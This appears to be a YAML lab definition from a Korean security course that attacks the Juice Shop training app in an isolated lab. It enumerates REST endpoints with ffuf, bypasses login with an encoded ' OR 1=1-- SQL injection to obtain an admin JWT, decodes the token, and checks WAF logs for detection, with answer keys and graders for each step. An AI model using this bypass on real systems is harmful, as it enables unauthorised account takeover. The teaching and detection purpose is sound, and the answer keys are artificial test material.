@@ -1,0 +1,268 @@
+lab_id: standalone-attack-week03
+title: "웹앱 구조·API·JWT 공격 vs API 남용 탐지"
+version: standalone-attack
+course: attack
+week: 3
+description: |
+  현대 웹앱(juiceshop)의 REST API + JWT 인증을 공격한다 — API 엔드포인트 열거, 로그인 SQLi 인증 우회로
+  JWT 획득, JWT payload 디코드(내용 노출), 그리고 API 남용의 방어 탐지. 공격은 el34-attacker, 대상은
+  juice.el34.lab(REST API). 인가된 실습만. 명령은 el34 호스트에서.
+difficulty: hard
+duration_minutes: 180
+prerequisites:
+  - "W01–W02 통과"
+  - "el34 호스트 SSH + docker exec"
+  - "lecture §2(API) §3(JWT) §4(인증우회) 숙지"
+objectives:
+  - "REST API 엔드포인트 열거"
+  - "로그인 SQLi로 인증 우회 + JWT 획득"
+  - "JWT payload 디코드(내용 노출)"
+  - "API 남용의 방어 탐지"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 점검 — juiceshop API
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' http://10.20.30.1/rest/products/search?q=test | head -c 150"
+      ```
+      ## ✅ 합격 기준
+      juiceshop REST API가 JSON을 반환한다.
+    hint: 'curl /rest/products/search'
+    category: survey
+    points: 10
+    answer: |
+      echo "=== juiceshop REST API ==="
+      docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' http://10.20.30.1/rest/products/search?q=test | head -c 200"
+      echo ""
+    answer_detail: "juiceshop = 현대 웹앱(REST API + JWT). /rest/products/search가 JSON 반환 = API 기반. 공격 표면이 엔드포인트+토큰."
+    verify:
+      type: output_contains
+      expect: 'success'
+      field: stdout
+      semantic:
+        intent: "juiceshop API 점검"
+        success_criteria: ["REST API JSON 응답"]
+        acceptable_methods: ["**[OSS] curl /rest (권장)**"]
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 API 엔드포인트 열거
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c 'printf "products\nuser\nFeedbacks\nBasketItems\nadmin\n" > /tmp/aw3.txt'
+      docker exec el34-attacker ffuf -u http://10.20.30.1/rest/FUZZ -w /tmp/aw3.txt -H 'Host: juice.el34.lab' -mc 200,401,500 -s
+      docker exec el34-attacker rm -f /tmp/aw3.txt
+      ```
+      ## ✅ 합격 기준
+      /rest/* 엔드포인트를 열거한다.
+    hint: 'ffuf /rest/FUZZ'
+    category: recon
+    points: 12
+    answer: |
+      echo "=== API 엔드포인트 열거 (/rest/*) ==="
+      docker exec el34-attacker sh -c 'printf "products\nuser\nFeedbacks\nBasketItems\nadmin\nproducts/search\n" > /tmp/aw3.txt'
+      docker exec el34-attacker ffuf -u http://10.20.30.1/rest/FUZZ -w /tmp/aw3.txt -H 'Host: juice.el34.lab' -mc 200,401,500 -s 2>&1 | head -10
+      docker exec el34-attacker rm -f /tmp/aw3.txt
+      echo "→ 각 엔드포인트가 공격 지점. 다량 요청은 스캐너성으로 탐지(W02)"
+    answer_detail: "API 열거 = 엔드포인트 매핑(/rest/user, /rest/products...). 각각 공격 지점. JS 앱은 수많은 API를 부르므로 표면이 넓다."
+    verify:
+      type: output_contains
+      expect: 'user'
+      field: stdout
+      semantic:
+        intent: "API 엔드포인트 열거"
+        success_criteria: ["/rest/* 엔드포인트 발견"]
+        acceptable_methods: ["**[OSS] ffuf /rest/FUZZ (권장)**"]
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 인증 우회 — 로그인 SQLi → JWT 획득
+      ## 💻 실행 명령
+      ```bash
+      # 이메일에 SQLi(' OR 1=1--) → 첫 사용자(admin)로 우회 로그인
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/sqli.json'
+      docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/sqli.json http://10.20.30.1/rest/user/login | head -c 120"
+      docker exec el34-attacker rm -f /tmp/sqli.json
+      ```
+      ## ✅ 합격 기준
+      SQLi 인증 우회로 JWT(`authentication.token`)를 획득한다.
+    hint: '로그인 SQLi → authentication.token'
+    category: manipulation
+    points: 16
+    answer: |
+      echo "=== 인증 우회 (로그인 SQLi ' OR 1=1--) ==="
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/sqli.json'
+      docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/sqli.json http://10.20.30.1/rest/user/login | head -c 150"
+      docker exec el34-attacker rm -f /tmp/sqli.json
+      echo ""
+      echo "→ ' OR 1=1-- 가 첫 사용자(admin)로 우회 → authentication.token(JWT) 획득 = A07 인증 우회"
+    answer_detail: "로그인 SQLi(' OR 1=1--)가 쿼리를 참으로 만들어 첫 사용자(admin)로 로그인 → JWT 토큰 획득. 정상 로그인은 401, 우회는 token 반환. OWASP A07(인증 실패)."
+    verify:
+      type: output_contains
+      expect: 'authentication'
+      field: stdout
+      semantic:
+        intent: "로그인 SQLi 인증 우회 + JWT 획득"
+        success_criteria: ["SQLi 우회 성공", "authentication.token 획득"]
+        acceptable_methods: ["**[OSS] 로그인 SQLi → token (권장)**"]
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 JWT 디코드 — payload 내용 노출
+      ## 💻 실행 명령
+      ```bash
+      # 토큰 획득 후 payload(2번째 부분) base64 디코드
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
+      T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/s.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/")
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/s.json'
+      ```
+      ## ✅ 합격 기준
+      JWT payload에서 사용자 정보(email 등)가 노출된다.
+    hint: 'JWT payload(2nd part) base64 디코드'
+    category: analysis
+    points: 14
+    answer: |
+      echo "=== JWT payload 디코드 (서명 검증 없이 내용 노출) ==="
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
+      T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/s.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/")
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 300; rm -f /tmp/s.json'
+      echo ""
+      echo "→ JWT payload는 누구나 base64 디코드 가능 → email/권한 등 노출. 민감정보 담으면 위험"
+    answer_detail: "JWT는 header.payload.signature(base64url). payload는 서명 검증 없이 누구나 디코드 → 내부 데이터(email=admin@juice-sh.op, 권한) 노출. 민감정보를 payload에 담으면 안 된다."
+    verify:
+      type: output_contains
+      expect: 'email'
+      field: stdout
+      semantic:
+        intent: "JWT payload 디코드로 내용 노출"
+        success_criteria: ["payload 디코드", "email/사용자 정보 노출"]
+        acceptable_methods: ["**[OSS] JWT payload base64 디코드 (권장)**"]
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 API 남용 탐지 (방어 관점)
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-web sh -c 'sudo tail -120 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+      ```
+      ## ✅ 합격 기준
+      로그인 SQLi가 WAF(942)에 탐지됨을 확인한다.
+    hint: 'modsec 942 (로그인 SQLi)'
+    category: analysis
+    points: 12
+    answer: |
+      echo "=== API 남용 탐지 (로그인 SQLi → WAF) ==="
+      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+      echo "→ 로그인 API의 SQLi 페이로드가 ModSec 942(SQLi)에 탐지. API 열거는 스캐너성으로 탐지"
+    answer_detail: "API 공격도 방어층에 남는다 — 로그인 SQLi는 ModSec 942(juice는 DetectionOnly라 200이지만 탐지는 기록). API 열거는 다량 요청으로 IDS/WAF에."
+    verify:
+      type: output_contains
+      expect: '942'
+      field: stdout
+      semantic:
+        intent: "API 남용의 방어 탐지"
+        success_criteria: ["로그인 SQLi 942 탐지"]
+        acceptable_methods: ["**[OSS] modsec 942 (권장)**"]
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 API 공격 표면 정리
+      ## 💻 실행 명령
+      ```bash
+      echo "엔드포인트(/rest/user,/rest/products...) + 인증(로그인 SQLi) + JWT(약한 서명/alg none/만료) = API 공격 표면"
+      ```
+      ## ✅ 합격 기준
+      API/JWT 공격 표면을 정리한다.
+    hint: '엔드포인트+인증+JWT 표면'
+    category: analysis
+    points: 8
+    answer: |
+      echo "=== API 공격 표면 ==="
+      echo "① 엔드포인트: /rest/user, /rest/products, /api/Feedbacks... (열거로 매핑)"
+      echo "② 인증: 로그인 SQLi(A07), credential stuffing, 토큰 탈취"
+      echo "③ JWT: 약한 서명키(brute), alg:none 우회, 만료 미검증, payload 노출"
+      echo "→ 현대 웹 공격 표면 = 엔드포인트 + 토큰"
+    answer_detail: "API 공격 표면 = 엔드포인트(열거) + 인증(우회) + JWT(조작). 전통 웹과 다른 접근 — 토큰과 API 중심."
+    verify:
+      type: output_contains
+      expect: 'JWT'
+      field: stdout
+      semantic:
+        intent: "API/JWT 공격 표면 정리"
+        success_criteria: ["엔드포인트/인증/JWT"]
+        acceptable_methods: ["**[관리적] 표면 정리 (권장)**"]
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 JWT 약점 방법론
+      ## 💻 실행 명령
+      ```bash
+      echo "JWT 공격: ①payload 노출(base64) ②alg:none 서명 우회 ③약한 HMAC키 brute ④만료/서명 미검증"
+      ```
+      ## ✅ 합격 기준
+      JWT 공격 기법을 정리한다.
+    hint: 'JWT 약점 4종'
+    category: report
+    points: 10
+    answer: |
+      echo "=== JWT 공격 기법 ==="
+      echo "① payload 노출: base64 디코드로 누구나 내용 열람(민감정보 담으면 위험)"
+      echo "② alg:none: 서명 알고리즘을 none으로 바꿔 서명 우회(검증 부실 시)"
+      echo "③ 약한 HMAC 키: 짧은 서명키를 brute-force(hashcat) → 임의 토큰 위조"
+      echo "④ 만료/서명 미검증: 만료된/변조된 토큰을 서버가 안 막으면 재사용"
+      echo "→ 방어: 강한 키, alg 고정, 만료/서명 엄격 검증, 민감정보 미포함"
+    answer_detail: "JWT 약점 = payload 노출 + 서명 우회(alg:none/약한키) + 검증 부실. 방어는 강한 키·alg 고정·엄격 검증."
+    verify:
+      type: output_contains
+      expect: 'alg'
+      field: stdout
+      semantic:
+        intent: "JWT 공격 기법 정리"
+        success_criteria: ["payload/alg none/약한키/검증"]
+        acceptable_methods: ["**[설명] JWT 약점 (권장)**"]
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 API/JWT 공격 보고서
+      ## 💻 보고서 양식
+      ```markdown
+      # 공격 W03 API/JWT 보고서 (학번, 이름)
+      ## 1. API 열거 (엔드포인트)
+      ## 2. 인증 우회 (로그인 SQLi → JWT)
+      ## 3. JWT 디코드 (내용 노출)
+      ## 4. 방어 탐지 + JWT 약점
+      ```
+      ## ✅ 합격 기준
+      보고서에 API 공격 + JWT 분석이 포함된다.
+    hint: 'API열거+인증우회+JWT+탐지'
+    category: report
+    points: 10
+    answer: |
+      cat <<'EOF'
+      # 공격 W03 API/JWT 보고서
+      ## 1. API 열거: /rest/user, /rest/products... (ffuf 매핑)
+      ## 2. 인증 우회: 로그인 SQLi(' OR 1=1--) → admin JWT 획득(A07)
+      ## 3. JWT 디코드: payload base64 → email=admin@juice-sh.op 등 노출
+      ## 4. 방어: 로그인 SQLi → ModSec 942. JWT 약점(payload노출/alg none/약한키/검증부실)
+      ## 결론: 현대 웹 공격은 엔드포인트+토큰 중심. JWT는 디코드 가능 + 서명 우회 위험
+      EOF
+    answer_detail: "API/JWT 공격 = 열거 + 인증 우회 + 토큰 조작. 현대 웹앱의 표면을 이해하는 것이 핵심."
+    verify:
+      type: output_contains
+      expect: 'JWT'
+      field: stdout
+      semantic:
+        intent: "API/JWT 종합 보고"
+        success_criteria: ["API 열거", "인증 우회", "JWT 분석"]
+        acceptable_methods: ["**[관리적] API/JWT 보고서 (권장)**"]
+    target_vm: web
